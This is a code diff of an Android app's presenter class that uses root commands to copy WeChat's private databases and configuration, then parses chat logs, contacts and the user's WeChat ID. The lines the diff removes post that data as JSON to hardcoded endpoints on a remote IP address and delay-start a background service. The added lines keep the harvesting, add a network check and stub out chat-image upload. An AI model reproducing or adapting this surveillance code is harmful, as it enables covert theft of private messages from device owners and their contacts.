@@ -1,27 +1,24 @@
 package cn.truistic.enmicromsg.main.presenter;
 
 import android.content.Context;
-import android.content.Intent;
+
 import android.os.AsyncTask;
 import android.os.Handler;
+import android.widget.Toast;
+
+
 
 import java.io.File;
 import java.util.ArrayList;
-import java.util.List;
 
-
-import cn.truistic.enmicromsg.common.db.DBUtill;
-import cn.truistic.enmicromsg.common.service.WhiteService;
+import cn.truistic.enmicromsg.common.db.DBUtil;
 import cn.truistic.enmicromsg.common.util.DeviceUtil;
-import cn.truistic.enmicromsg.common.util.JsonUtil;
+import cn.truistic.enmicromsg.common.util.NetworkUtils;
+import cn.truistic.enmicromsg.common.util.PathUtils;
 import cn.truistic.enmicromsg.common.util.RootUtil;
-import cn.truistic.enmicromsg.info.ContentInfo;
-import cn.truistic.enmicromsg.info.MessageInfo;
-import cn.truistic.enmicromsg.info.UserInfo;
 import cn.truistic.enmicromsg.main.MainMVP;
 import cn.truistic.enmicromsg.main.model.HomeModel;
 
-import static cn.truistic.enmicromsg.common.util.DeviceUtil.postJson;
 
 
 /**
@@ -29,26 +26,9 @@ import static cn.truistic.enmicromsg.common.util.DeviceUtil.postJson;
  */
 public class HomePresenter implements MainMVP.IHomePresenter {
 
-    private static final String ContentUrlPath =
-            "http://113.105.55.205:8090/UpData/ReceiveContent.aspx";
-    private static final String MessageUrlPath =
-            "http://113.105.55.205:8090/UpData/ReceiveMessage.aspx";
-    private static final String UserInfoUrlPath =
-            "http://113.105.55.205:8090/UpData/ReceiveUserInfo.aspx";
-
-
-
-    private String mJsonContent,mJsonMessage,mJsonUser;
-
-
-    List<MessageInfo> mMessageInfos = new ArrayList<>();
-    List<UserInfo> mUserInfos= new ArrayList<>();
-    List<ContentInfo> mContentInfos = new ArrayList<>();
-
     private Context context;
     private MainMVP.IHomeView homeView;
     private MainMVP.IHomeModel homeModel;
-
 
 
     public HomePresenter(Context context, MainMVP.IHomeView homeView) {
@@ -100,8 +80,6 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 }
                 publishProgress(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);
                 homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_SERVICE, MainMVP.IHomeView.State.TRUE);
-                flag = false;
-
 
                 // 4****************************检测是否已授权应用Root权限*************************************
                 publishProgress(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.DETECTING);
@@ -114,7 +92,19 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_PERMISSION, MainMVP.IHomeView.State.TRUE);
 
 
-                // 5*******************************获取微信相关数据**********************************************
+                // 5****************************检测手機網絡*************************************
+                publishProgress(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.DETECTING);
+                if (!detectInternet()) {
+                    publishProgress(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.FALSE);
+                    homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.FALSE);
+                    break;
+                }
+                publishProgress(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.TRUE);
+                homeModel.saveState(MainMVP.IHomeView.Progress.DETECT_INTERNET, MainMVP.IHomeView.State.TRUE);
+
+
+
+                // 6*******************************获取微信相关数据**********************************************
                 publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.DETECTING);
                 if (!requestData()) {
                     publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.FALSE);
@@ -124,7 +114,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 publishProgress(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);
                 homeModel.saveState(MainMVP.IHomeView.Progress.REQUEST_DATA, MainMVP.IHomeView.State.TRUE);
 
-                // 6解析微信相关数据********************聊天记录************************************
+                // 7解析微信相关数据********************聊天记录************************************
                 publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.DETECTING);
                 if (!analysisData()) {
                     publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.FALSE);
@@ -133,9 +123,8 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 }
                 publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
                 homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_DATA, MainMVP.IHomeView.State.TRUE);
-                flag = false;
 
-                // 7.解析微信相关数据******************联系人************************************
+                // 8.解析微信相关数据******************联系人************************************
                 publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.DETECTING);
                 if (!analysisContent()) {
                     publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.FALSE);
@@ -144,9 +133,8 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 }
                 publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);
                 homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_CONNTENT, MainMVP.IHomeView.State.TRUE);
-                flag = false;
 
-                // 8解析微信相关数据******************微信号************************************
+                // 9解析微信相关数据******************微信号************************************
                 publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.DETECTING);
                 if (!analysisUser()) {
                     publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.FALSE);
@@ -155,22 +143,21 @@ public class HomePresenter implements MainMVP.IHomePresenter {
                 }
                 publishProgress(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);
                 homeModel.saveState(MainMVP.IHomeView.Progress.ANALYSIS_USER, MainMVP.IHomeView.State.TRUE);
-                flag = false;
 
 
-                // 9解析微信相关数据******************上传数据************************************
-                publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.DETECTING);
-                if (!uploadData()) {
-                    publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.FALSE);
-                    homeModel.saveState(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.FALSE);
+                // 10解析微信相关数据******************上传微信聊天圖片************************************
+                publishProgress(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State
+                        .DETECTING);
+                if (!uploadImageData()) {
+                    publishProgress(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.FALSE);
+                    homeModel.saveState(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.FALSE);
                     break;
                 }
-                publishProgress(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.TRUE);
-                homeModel.saveState(MainMVP.IHomeView.Progress.UPLOAD_DATA, MainMVP.IHomeView.State.TRUE);
+                publishProgress(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.TRUE);
+                homeModel.saveState(MainMVP.IHomeView.Progress.UPLOADIMAGE_DATA, MainMVP.IHomeView.State.TRUE);
                 flag = false;
 
             }
-
 
             return null;
         }
@@ -185,28 +172,6 @@ public class HomePresenter implements MainMVP.IHomePresenter {
             homeView.onDetectStop();
         }
     }
-    /**
-     * 检测数据是否上传
-     *
-     * @return true，已上传
-     */
-    private boolean uploadData() {
-
-        mJsonMessage = JsonUtil.toJson(mMessageInfos);
-        mJsonContent = JsonUtil.toJson(mContentInfos);
-        mJsonUser = JsonUtil.toJson(mUserInfos);
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                postJson(ContentUrlPath,mJsonContent);
-                postJson(MessageUrlPath,mJsonMessage);
-                postJson(UserInfoUrlPath,mJsonUser);
-            }
-        }).start();
-
-        return true;
-    }
-
 
     /**
      * 检测微信是否已经安装
@@ -214,6 +179,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
      * @return true，微信已安装
      */
     private boolean detectWechat() {
+
         return DeviceUtil.isAppInstalled(context, "com.tencent.mm");
     }
 
@@ -223,14 +189,7 @@ public class HomePresenter implements MainMVP.IHomePresenter {
      * @return true, 设备已开启
      */
     private boolean detectService() {
-        Handler handler = new Handler(context.getMainLooper());
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                Intent whiteIntent = new Intent(context, WhiteService.class);
-                context.startService(whiteIntent);
-            }
-        },1000 * 60 *5);  //5分钟
+
         return true;
     }
 
@@ -252,68 +211,75 @@ public class HomePresenter implements MainMVP.IHomePresenter {
     }
 
     /**
+     * 检测手机网络
+     *
+     * @return true,
+     */
+    private boolean detectInternet() {
+
+        //判断网络是否可用
+
+        Handler handler = new Handler(context.getMainLooper());
+        handler.postDelayed(() -> {
+            if (NetworkUtils.isAvailableByPing()){
+                if (NetworkUtils.isConnected(context)){
+                    Toast.makeText(context, "网络可用,当前网络为"+String.valueOf(NetworkUtils.getNetworkType
+                            (context)),Toast.LENGTH_SHORT).show();
+
+                }else {
+                    Toast.makeText(context,"网络未连接,请检查网络",Toast.LENGTH_SHORT).show();
+
+                }
+            }else {
+                Toast.makeText(context,"网络不可用,请检查网络",Toast.LENGTH_SHORT).show();
+
+            }
+
+        },0);
+        return true;                    //当前网络是否可用
+    }
+
+    /**
      * 获取微信数据
      *
      * @return true, 获取成功
      */
     private boolean requestData() {
-        // 1.获取配置文件，用于获取uin
-        String sharedPerfsPath = "/data/data/cn.truistic.enmicromsg/shared_prefs/system_config_prefs.xml";
-        RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/shared_prefs/system_config_prefs.xml "
-                + sharedPerfsPath, "chmod 777 " + sharedPerfsPath});
-        File sharedPerfsFile = new File(sharedPerfsPath);
-        if (!sharedPerfsFile.exists()) {
-            return false;
-        }
-        // 2.获取数据库文件
-        ArrayList<String> list;
 
-        list = RootUtil.execCmdsforResult(new String[]{"cd /data/data/com.tencent.mm/MicroMsg", "ls -R"});
-        ArrayList<String> dirs = new ArrayList<>();
-        String dir = null;
-        String item = null;
-        for (int i = 0; i < list.size(); i++) {
-            item = list.get(i);
-            if (item.startsWith("./") && item.length() == 35) {
-                dir = item;
-            } else if (item.equals("EnMicroMsg.db")) {
-                dirs.add(dir.substring(2, 34));
-            }
-        }
-        if (dirs.size() == 0) {
-            return false;
-        } else {
-            for (int i = 0; i < dirs.size(); i++) {
-                RootUtil.execCmds(new String[]{"cp /data/data/com.tencent.mm/MicroMsg/" + dirs.get(i)
-                        + "/EnMicroMsg.db " + context.getFilesDir() + "/EnMicroMsg" + i + ".db",
-                        "chmod 777 " + context.getFilesDir() + "/EnMicroMsg" + i + ".db"});
-            }
-        }
-
+        ArrayList<String> dirs = PathUtils.getUinAndDir(context);
         File dbFile;
         int i, j = 0;
-        for (i = 0; i < dirs.size(); i++) {
-            dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
-            if (!dbFile.exists()) {
-                break;
+        if (dirs != null) {
+            for (i = 0; i < dirs.size(); i++) {
+                dbFile = new File(context.getFilesDir() + "/EnMicroMsg" + i + ".db");
+                if (!dbFile.exists()) {
+                    break;
+                }
+                j++;
             }
-            j++;
         }
         if (j == 0)
             return false;
         homeModel.saveDbNum(j);
         return true;
+
     }
 
 
     /**
-     * 解析微信相关数据---------------------------------聊天記錄-----------------------------------------------
+     * 解析微信相关数据---------------------------------聊天記錄----------------------------------------
      *
-     * @return
+     * @return true
      */
     private boolean analysisData() {
-        DBUtill.queryMessage(context);
+        int dbNum = homeModel.getDbNum();
+        if (dbNum == 0){
+            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
+            return false;
+        }
+        DBUtil.queryMessage(context);
         return true;
+
     }
 
     /**
@@ -322,18 +288,45 @@ public class HomePresenter implements MainMVP.IHomePresenter {
      * @return true
      */
     private boolean analysisContent() {
-        DBUtill.queryContent(context);
+        int dbNum = homeModel.getDbNum();
+        if (dbNum == 0){
+            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
+            return false;
+        }
+        DBUtil.queryContent(context);
         return true;
+
     }
 
 
     /**
      * 解析微信相关数据*********************************查询微信号****************************************
      *
-     * @return
+     * @return true
      */
     private boolean analysisUser() {
-        DBUtill.queryUser(context);
+        int dbNum = homeModel.getDbNum();
+        if (dbNum == 0){
+            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
+            return false;
+        }
+        DBUtil.queryUser(context);
+        return true;
+
+    }
+
+    /**
+     * 解析微信相关数据*********************************微信聊天圖片****************************************
+     *
+     * @return true，已上传
+     */
+    private boolean uploadImageData() {
+//        int dbNum = homeModel.getDbNum();
+//        if (dbNum == 0){
+//            Toast.makeText(context,"获取微信数据库失败!",Toast.LENGTH_SHORT).show();
+//            return false;
+//        }
+//        DBUtil.queryImage(context);
         return true;
     }
 
